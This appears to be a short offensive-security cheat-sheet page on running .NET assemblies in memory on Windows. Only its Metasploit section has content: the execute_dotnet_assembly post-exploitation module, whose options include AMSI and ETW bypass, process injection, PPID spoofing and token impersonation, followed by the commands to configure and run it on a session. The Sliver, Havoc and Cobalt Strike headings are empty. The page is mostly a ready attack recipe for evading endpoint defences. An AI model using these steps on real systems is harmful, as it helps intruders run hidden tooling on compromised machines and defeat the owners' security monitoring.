# Execute Assembly

## 01 - Windows

### 1.1 - Metasploit

```
msf > use post/windows/manage/execute_dotnet_assembly

Module options (post/windows/manage/execute_dotnet_assembly):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   AMSIBYPASS      true             yes       Enable Amsi bypass
   ARGUMENTS                        no        Command line arguments
   DOTNET_EXE                       yes       Assembly file name
   ETWBYPASS       true             yes       Enable Etw bypass
   PID             0                no        Pid  to inject
   PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
   PROCESS         notepad.exe      no        Process to spawn
   SESSION                          yes       The session to run this module on
   Signature       Automatic        yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
   USETHREADTOKEN  true             no        Spawn process with thread impersonation
   WAIT            10               no        Time in seconds to wait

msf post(windows/manage/execute_dotnet_assembly) > set dotnet_exe /path/to/dotnettools.exe

msf post(windows/manage/execute_dotnet_assembly) > set arguments [arguments]

msf post(windows/manage/execute_dotnet_assembly) > set session <session_id>

msf post(windows/manage/execute_dotnet_assembly) > run
```

### 1.2 - Sliver

### 1.3 - Havoc

### 1.4 - Cobalt Strike